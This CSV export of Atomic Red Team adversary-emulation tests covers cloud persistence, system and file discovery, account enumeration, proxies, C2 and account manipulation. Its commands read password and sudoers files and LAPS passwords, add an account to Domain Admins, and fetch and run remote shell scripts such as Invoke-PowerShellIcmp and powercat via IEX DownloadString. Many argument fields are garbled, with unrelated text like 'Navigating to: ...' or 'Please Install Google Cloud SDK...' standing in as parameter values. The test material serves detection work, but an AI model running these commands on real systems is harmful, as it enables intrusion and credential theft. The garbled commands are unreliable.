"MITRE_ID","File","AtomicTest","ExecutorName","Command","Cleanup","Dependencies"
"T1078.004","C:\AtomicRedTeam\atomics\T1078.004\T1078.004.yaml","Azure Persistence Automation Runbook Created or Modified","powershell","New-AzAutomationRunbook -Name Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/ -Type PowerShell -ResourceGroupName Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/ -Description 'my-test-runbook' -AutomationAccountName Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/
","Remove-AzAutomationRunbook -AutomationAccountName Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/ -Name Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/ -ResourceGroupName Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/ -Force
Remove-AzAutomationAccount -ResourceGroupName Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/ -Name Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/ -Force
Remove-AzResourceGroup -Name Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/ -Force
echo ""Cleanup should be completed. Run 'terraform destroy` to ensure remaining resources are also deleted.""
cd ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
terraform destroy -auto-approve
","echo ""Please install terraform via https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli (URL accurate as of Nov. 15, 2024)."" ; $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\AzureCLI.msi ; echo ""* Configure your Azure account using: Connect-AzAccount"" ; echo ""Navigating to: $PathToAtomicsFolder/T1078.004/src/T1078.004-2/"" cd ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/"" terraform init terraform apply -auto-approve "
"T1078.004","C:\AtomicRedTeam\atomics\T1078.004\T1078.004.yaml","GCP - Create Custom IAM Role","sh","gcloud config set project Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install
gcloud iam roles create Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install --description=""Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install"" --permissions=Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install --project=Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install
","gcloud iam roles delete Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install --project=Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install
","echo ""Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install"" ; gcloud auth login --no-launch-browser "
"T1082","C:\AtomicRedTeam\atomics\T1082\T1082.yaml","List OS Information","sh","uname -a >> /tmp/T1082.txt
if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi
if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   
if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi
if [ -f /etc/os-release ]; then cat /etc/os-release >> /tmp/T1082.txt; fi
uptime >> /tmp/T1082.txt
cat /tmp/T1082.txt 2>/dev/null
","rm /tmp/T1082.txt 2>/dev/null
",""
"T1082","C:\AtomicRedTeam\atomics\T1082\T1082.yaml","Griffon Recon","powershell","cscript ""#{vbscript}""
",,"New-Item -Type Directory (split-path ""#{vbscript}"") -ErrorAction ignore | Out-Null Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs"" -OutFile ""#{vbscript}"" "
"T1082","C:\AtomicRedTeam\atomics\T1082\T1082.yaml","Azure Security Scan with SkyArk","powershell","Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"" -force      
$Password = ConvertTo-SecureString -String ""PathToAtomicsFolder\..\ExternalPayloads\"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""PathToAtomicsFolder\..\ExternalPayloads\"", $Password
Connect-AzAccount -Credential $Credential
Connect-AzureAD -Credential $Credential
Scan-AzureAdmins -UseCurrentCred
","$resultstime = Get-Date -Format ""yyyyMMdd""
$resultsfolder = (""Results-"" + $resultstime)
remove-item $env:temp\$resultsfolder -recurse -force -erroraction silentlycontinue
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null invoke-webrequest ""https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"" ; Install-Module -Name AzureAD -Force ; Install-Module -Name Az -Force "
"T1082","C:\AtomicRedTeam\atomics\T1082\T1082.yaml","ESXi - VM Discovery using ESXCLI","command_prompt","echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\"" ""PathToAtomicsFolder\..\ExternalPayloads\"" -ssh  -l ""PathToAtomicsFolder\..\ExternalPayloads\"" -pw ""PathToAtomicsFolder\..\ExternalPayloads\"" -m ""PathToAtomicsFolder\..\ExternalPayloads\""
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}"" "
"T1082","C:\AtomicRedTeam\atomics\T1082\T1082.yaml","ESXi - Darkside system information discovery","command_prompt","echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\"" ""PathToAtomicsFolder\..\ExternalPayloads\"" -ssh  -l ""PathToAtomicsFolder\..\ExternalPayloads\"" -pw ""PathToAtomicsFolder\..\ExternalPayloads\"" -m ""PathToAtomicsFolder\..\ExternalPayloads\""
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}"" "
"T1083","C:\AtomicRedTeam\atomics\T1083\T1083.yaml","File and Directory Discovery (cmd.exe)","command_prompt","dir /s c:\ >> %temp%\T1083Test1.txt
dir /s ""c:\Documents and Settings"" >> %temp%\T1083Test1.txt
dir /s ""c:\Program Files\"" >> %temp%\T1083Test1.txt
dir ""%systemdrive%\Users\*.*"" >> %temp%\T1083Test1.txt
dir ""%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"" >> %temp%\T1083Test1.txt
dir ""%userprofile%\Desktop\*.*"" >> %temp%\T1083Test1.txt
tree /F >> %temp%\T1083Test1.txt
","del %temp%\T1083Test1.txt
",""
"T1083","C:\AtomicRedTeam\atomics\T1083\T1083.yaml","Nix File and Directory Discovery","sh","ls -a >> /tmp/T1083.txt
if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;
file */* *>> /tmp/T1083.txt
cat /tmp/T1083.txt 2>/dev/null
find . -type f
ls -R | grep "":$"" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
locate *
which sh
","rm /tmp/T1083.txt
",""
"T1083","C:\AtomicRedTeam\atomics\T1083\T1083.yaml","Nix File and Directory Discovery 2","sh","cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt
if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;
find . -type f -iname *.pdf >> /tmp/T1083.txt
cat /tmp/T1083.txt
find . -type f -name "".*""
","rm /tmp/T1083.txt",""
"T1083","C:\AtomicRedTeam\atomics\T1083\T1083.yaml","Simulating MAZE Directory Enumeration","powershell","$folderarray = @(""Desktop"", ""Downloads"", ""Documents"", ""AppData/Local"", ""AppData/Roaming"")
Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\T1083Test5.txt
Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\T1083Test5.txt
Get-ChildItem -Path ""${env:ProgramFiles(x86)}"" -erroraction silentlycontinue | Out-File -append $env:temp\T1083Test5.txt
$UsersFolder = ""$env:homedrive\Users\""
foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue)
{
foreach ($secondarydirectory in $folderarray)
 {Get-ChildItem -Path ""$UsersFolder/$directory/$secondarydirectory"" -ErrorAction SilentlyContinue | Out-File -append $env:temp\T1083Test5.txt}
}
cat $env:temp\T1083Test5.txt
","remove-item $env:temp\T1083Test5.txt -ErrorAction SilentlyContinue
",""
"T1083","C:\AtomicRedTeam\atomics\T1083\T1083.yaml","Launch DirLister Executable","powershell","Start-Process ""#{dirlister_path}""
Start-Sleep -Second 4
Stop-Process -Name ""DirLister""
",,"$parentpath = Split-Path ""#{dirlister_path}"" New-Item -ItemType Directory -Force -Path $parentpath | Out-Null Invoke-WebRequest https://github.com/SanderSade/DirLister/releases/download/v2.beta4/DirLister.v2.beta4.zip -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip"" Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4"" -Force Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4\*"" ""$parentpath"" -Recurse Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4.zip"",""PathToAtomicsFolder\..\ExternalPayloads\TDirLister.v2.beta4"" -Recurse -ErrorAction Ignore "
"T1083","C:\AtomicRedTeam\atomics\T1083\T1083.yaml","ESXi - Enumerate VMDKs available on an ESXi Host","command_prompt","echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\"" ""PathToAtomicsFolder\..\ExternalPayloads\"" -ssh  -l ""PathToAtomicsFolder\..\ExternalPayloads\"" -pw ""PathToAtomicsFolder\..\ExternalPayloads\"" -m ""PathToAtomicsFolder\..\ExternalPayloads\""
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}"" "
"T1083","C:\AtomicRedTeam\atomics\T1083\T1083.yaml","Recursive Enumerate Files And Directories By Powershell","powershell","$out = ""$env:TEMP\T1083-Enumerate-net.txt""
$dirsFilter = @('Documents','Downloads','Desktop','OneDrive')
$exts = @('.pdf','.doc','.docx','.xls','.xlsx','.txt','.zip','.rar','.7z')
$userProfile = [Environment]::GetFolderPath('UserProfile')
$tr = [System.Collections.Generic.List[string]]::new()

function MatchesExtension($path) {
  try {
    $e = [System.IO.Path]::GetExtension($path).ToLower()
    return $exts -contains $e
  } catch { return $false }
}

function Scan-Dir($root) {
  try {
    $match = $false
    foreach ($f in $dirsFilter) { if ($root -like ""*$f*"") { $match = $true; break } }
    if (-not $match) { return }

    [System.IO.Directory]::EnumerateFiles($root) | ForEach-Object {
      if (MatchesExtension $_) {
        $fi = [System.IO.FileInfo]::new($_)
        $tr.Add(""[File] $_ Size:$($fi.Length) LastWrite:$($fi.LastWriteTime)"")
      }
    }

    [System.IO.Directory]::EnumerateDirectories($root) | ForEach-Object {
      Scan-Dir $_
    }
  } catch [System.UnauthorizedAccessException] {
    $tr.Add(""[AccessDenied] $root"")
  } catch {
    $tr.Add(""[Error] $root => $($_.Exception.Message)"")
  }
}

[System.IO.Directory]::EnumerateDirectories($userProfile) | ForEach-Object { Scan-Dir $_ }

# Ensure output dir exists
$outDir = [System.IO.Path]::GetDirectoryName($out)
if (-not [string]::IsNullOrEmpty($outDir) -and -not (Test-Path $outDir)) {
  New-Item -Path $outDir -ItemType Directory -Force | Out-Null
}

# Write results
$tr | Out-File -FilePath $out -Encoding UTF8
Write-Output ""Enumeration complete. Results written to: $out""
","Remove-Item -Path ""$env:TEMP\T1083-Enumerate-net.txt"" -ErrorAction SilentlyContinue
",""
"T1087.001","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml","Enumerate all accounts (Local)","sh","cat /etc/passwd > /tmp/T1087.001.txt
cat /tmp/T1087.001.txt
","rm -f /tmp/T1087.001.txt
",""
"T1087.001","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml","View sudoers access","sh","if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > /tmp/T1087.001.txt; fi;
if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > /tmp/T1087.001.txt; fi;
cat /tmp/T1087.001.txt
","rm -f /tmp/T1087.001.txt
",""
"T1087.001","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml","View accounts with UID 0","sh","grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt
grep '*:0:' /etc/passwd >> /tmp/T1087.001.txt
cat /tmp/T1087.001.txt 2>/dev/null
","rm -f /tmp/T1087.001.txt 2>/dev/null
",""
"T1087.001","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml","Show if a user account has ever logged in remotely","sh","[ ""$(uname)"" = 'FreeBSD' ] && cmd=""lastlogin"" || cmd=""lastlog"" 
$cmd > /tmp/T1087.001.txt
cat /tmp/T1087.001.txt
","rm -f /tmp/T1087.001.txt
","sudo apt-get install login; exit 1; "
"T1087.001","C:\AtomicRedTeam\atomics\T1087.001\T1087.001.yaml","ESXi - Local Account Discovery via ESXCLI","command_prompt","echo """" | ""PathToAtomicsFolder\..\ExternalPayloads\"" -batch ""PathToAtomicsFolder\..\ExternalPayloads\"" -ssh -l PathToAtomicsFolder\..\ExternalPayloads\ -pw ""PathToAtomicsFolder\..\ExternalPayloads\"" ""esxcli system account list""
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}"" "
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Enumerate logged on users via CMD (Domain)","command_prompt","query user /SERVER:%COMPUTERNAME%
",,""
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Automated AD Recon (ADRecon)","powershell","Invoke-Expression ""PathToAtomicsFolder\..\ExternalPayloads\""
","Get-ChildItem ""PathToAtomicsFolder\..\ExternalPayloads"" -Recurse -Force | Where{$_.Name -Match ""^ADRecon-Report-""} | Remove-Item -Force -Recurse
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest -Uri ""https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1"" -OutFile ""#{adrecon_path}"" "
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Adfind -Listing password policy","command_prompt","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
",,"New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" "
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Adfind - Enumerate Active Directory Admins","command_prompt","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe
",,"New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" "
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Adfind - Enumerate Active Directory User Objects","command_prompt","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe
",,"New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" "
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Adfind - Enumerate Active Directory Exchange AD Objects","command_prompt","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe
",,"New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" "
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Enumerate Active Directory for Unconstrained Delegation","powershell","Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain
",,"if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online } else {   Install-WindowsFeature RSAT-AD-PowerShell } "
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Kerbrute - userenum","powershell","cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe userenum -d PathToAtomicsFolder\..\ExternalPayloads\ --dc PathToAtomicsFolder\..\ExternalPayloads\ ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null invoke-webrequest ""https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"" ; New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null invoke-webrequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\username.txt"" "
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Suspicious LAPS Attributes Query with Get-ADComputer all properties","powershell","Get-ADComputer $env:computername -Properties *",,""
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property","powershell","Get-ADComputer $env:computername -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime",,""
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Suspicious LAPS Attributes Query with adfind all properties","powershell","& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""  -h $env:USERDOMAIN -s subtree -f ""objectclass=computer"" *
",,""
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd","powershell","& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""  -h $env:USERDOMAIN -s subtree -f ""objectclass=computer"" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
",,""
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Active Directory Domain Search","sh","ldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b ""CN=Users,DC=example,DC=test"" -s sub -a always -z 1000 dn
",,"echo ldapsearch not found "
"T1087.002","C:\AtomicRedTeam\atomics\T1087.002\T1087.002.yaml","Account Enumeration with LDAPDomainDump","sh","ldapdomaindump -u domain\user -p password 127.0.0.1 -o /tmp/T1087","rm -rf /tmp/T1087/ 2>/dev/null 
","sudo apt-get -y install python3; wget -O /tmp/get-pip.py https://bootstrap.pypa.io/pip/3.6/get-pip.py python3 /tmp/get-pip.py; pip install ldapdomaindump; pip install future"
"T1090.001","C:\AtomicRedTeam\atomics\T1090.001\T1090.001.yaml","Connection Proxy","sh","export #{run_squid}_proxy=#{run_squid}:#{run_squid}
curl #{run_squid}
","unset #{run_squid}_proxy
[ ""#{run_squid}"" == ""true"" ] && (kill -9 $(ps aux | grep ""squid -N"" | grep -v ""grep"" | awk '{print $2}'))
","[ ""#{run_squid}"" = ""true"" ] && ([ -x ""$(command -v squid --version)"" ] || sudo DEBIAN_FRONTEND=noninteractive apt-get -y install squid curl || sudo yum install -y squid curl || sudo dnf install -y squid curl || brew install curl squid) && (squid -N -d 1 &) && exit 0 echo ""Value #{run_squid} for variable ""run_squid"" is not valid"" && exit 1"
"T1090.001","C:\AtomicRedTeam\atomics\T1090.001\T1090.001.yaml","Connection Proxy for macOS UI","sh","networksetup -setwebproxy Wi-Fi 127.0.0.1 8080
networksetup -setsecurewebproxy Wi-Fi 127.0.0.1 8080
","networksetup -setwebproxystate Wi-Fi off
networksetup -setsecurewebproxystate Wi-Fi off
",""
"T1090.001","C:\AtomicRedTeam\atomics\T1090.001\T1090.001.yaml","portproxy reg key","powershell","netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1","netsh interface portproxy delete v4tov4 listenport=1337 -ErrorAction Ignore | Out-Null",""
"T1090.003","C:\AtomicRedTeam\atomics\T1090.003\T1090.003.yaml","Tor Proxy Usage - Windows","powershell","invoke-expression 'cmd /c start powershell -Command {cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\""}'
sleep -s 60
stop-process -name ""tor"" | out-null
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://archive.torproject.org/tor-package-archive/torbrowser/11.0.6/tor-win32-0.4.6.9.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\tor.zip"" expand-archive -LiteralPath ""PathToAtomicsFolder\..\ExternalPayloads\tor.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\tor"" "
"T1095","C:\AtomicRedTeam\atomics\T1095\T1095.yaml","ICMP C2","powershell","IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress 127.0.0.1
",,""
"T1095","C:\AtomicRedTeam\atomics\T1095\T1095.yaml","Netcat C2","powershell","cmd /c ""#{ncat_path}"" #{ncat_path} #{ncat_path}
",,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -ItemType Directory -Force -Path ""#{ncat_path}"" | Out-Null $parentpath = Split-Path (Split-Path ""#{ncat_exe}""); $zippath = ""$parentpath\nmap.zip"" Invoke-WebRequest  ""https://nmap.org/dist/nmap-7.80-win32.zip"" -OutFile ""$zippath""   Expand-Archive $zippath $parentpath -Force   $unzipPath = Join-Path $parentPath ""nmap-7.80"" if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like ""Microsoft Visual C++*""}) ) {   Start-Process (Join-Path $unzipPath ""vcredist_x86.exe"") } "
"T1095","C:\AtomicRedTeam\atomics\T1095\T1095.yaml","Powercat C2","powershell","IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c 127.0.0.1 -p 80
",,""
"T1098","C:\AtomicRedTeam\atomics\T1098\T1098.yaml","Domain Account and Group Manipulate","powershell","$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = ""atr--$x$y$z""
New-ADUser -Name $account -GivenName ""Test"" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False 
Add-ADGroupMember ""Domain Admins"" $account
","Get-ADUser -LDAPFilter ""(&(samaccountname=atr--*)(givenName=Test))"" | Remove-ADUser -Confirm:$False
","if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online } else {   Install-WindowsFeature RSAT-AD-PowerShell } "
"T1098","C:\AtomicRedTeam\atomics\T1098\T1098.yaml","AWS - Create a group and add a user to that group","sh","aws iam create-group --group-name atomicredteam
aws iam add-user-to-group --user-name atomicredteam --group-name atomicredteam
","aws iam remove-user-from-group --user-name atomicredteam --group-name atomicredteam
aws iam delete-group --group-name atomicredteam
","echo Please run atomic test T1136.003, before running this atomic test "
"T1098","C:\AtomicRedTeam\atomics\T1098\T1098.yaml","Azure AD - adding user to Azure AD role","powershell","Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""p4sswd"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""jonh@contoso.com"", $Pword
Connect-AzureAD -Credential $Credential

$user = Get-AzureADUser -Filter ""DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'""
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq 'Global Reader'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId
Write-Host ""User $($user.DisplayName) was added to $($role.DisplayName) role""
","Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""p4sswd"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""jonh@contoso.com"", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore

$user = Get-AzureADUser -Filter ""DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'""
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq 'Global Reader'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId
Write-Host ""User $($user.DisplayName) was removed from $($role.DisplayName) role""
","Install-Module -Name AzureAD -Force "
